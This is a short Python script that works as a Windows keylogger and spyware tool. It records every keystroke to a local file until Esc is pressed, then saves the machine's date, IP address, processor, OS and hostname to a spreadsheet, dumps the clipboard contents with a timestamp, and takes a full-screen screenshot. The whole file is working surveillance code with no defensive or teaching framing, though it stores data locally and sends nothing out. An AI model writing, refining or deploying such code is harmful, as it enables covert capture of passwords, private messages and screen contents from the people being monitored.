from pynput.keyboard import Key, Listener
import datetime
import socket
import platform
import win32clipboard
from PIL import ImageGrab
import pandas as pd
keystrokes = []
temp_string = ""

def on_press(key):
    global temp_string
    key_str = str(key)
    if key_str.startswith("'") and len(key_str) == 3:
        if temp_string:
            keystrokes.append(temp_string)
            temp_string = ""
    else:
        temp_string += key_str
    write_file(key_str)

def write_file(key_str):
        
    with open("keystrokes.txt", "a") as f:
        f.write(key_str)
        f.write("\n")

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

date = datetime.date.today()
ip_address = socket.gethostbyname(socket.gethostname())
processor = platform.processor()
system = platform.system()
release = platform.release()
host_name = socket.gethostname()

data = {
    'Metric': ['Date', 'IP Address', 'Processor', 'System', 'Release', 'Host Name'],
    'Value': [date, ip_address, processor, system, release, host_name]
}
df = pd.DataFrame(data)

df.to_excel('system_info.xlsx', index=False)

def copy_clipboard():
    current_date = datetime.datetime.now()
    with open("clipboard.txt", "a") as f:
        win32clipboard.OpenClipboard()
        pasted_data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        f.write("\n")
        f.write("Date and Time: " + str(current_date) + "\n")
        f.write("Clipboard Data: \n" + pasted_data + "\n")

copy_clipboard()

def take_screenshot():
    screenshot = ImageGrab.grab()
    screenshot.save("screenshot.png")

take_screenshot()

